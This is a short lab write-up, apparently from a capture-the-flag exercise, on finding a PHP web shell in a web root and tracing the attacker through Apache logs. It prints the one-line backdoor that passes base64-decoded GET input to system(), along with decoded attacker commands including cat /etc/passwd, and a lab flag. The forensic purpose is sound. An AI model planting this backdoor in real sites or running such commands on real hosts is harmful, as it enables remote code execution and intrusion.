# PHP-Web-Shell-
This project documents the discovery and analysis of a PHP-based Web Shell and the subsequent investigation of attacker logs from a compromised server. The goal was to investigate identify the vulnerability and traces of an attack from an implanted webshell.
I began my investigation on the target web host by web root directory `/var/www/html.` My goal was to identify any unauthorized or suspicious `.php `files.
I discovered an unusual file located at` /img/images.php.` Upon inspecting the file using `cat` command I identified a critical Remote Code Execution (RCE) vulnerability :
it identified `<?php system(base64_decode($_GET['query'])); ?>` which contain backdoor code like The attacker used base64_decode to bypass simple signature-based security filters and Unsanitized user input passed directly to the OS system() functions.
I moved to` /var/log/apache2` to trace the attacker's activity. While access.log show no results for the backdoor, I found the evidence in` other_vhosts_access.log.1.`
I found  attacker time line and logs in `other_vhosts_access.log.1`
`ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:00 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404`
The logs showed the attacker initially received `404 (Not Found)` and` 500 (Internal Server Error) `codes while testing the backdoor location and syntax. Eventually, they achieved a `200 OK` and began executing commands. "`GET /CMSsite-master/img/images.php HTTP/1.1" 500 185 "http://10.10.80.94:8080/CMSsite-master/img/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"` 
Attacker  passes command using query like, when i decode payload using cyberchef. all query was in base64. as we found in` .php` file 
`?query=d2hvYW1pCg== -> whoami
bHMK ->ls
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo= -> echo 'THM{sup3r_34sy_w3bsh3ll}'
aWZjb25maWcK ->ifconfig
Y2F0IC9ldGMvcGFzc3dkCg== -> cat /etc/passwd
aWQK -> id`
So here is investigation of backdoor! 
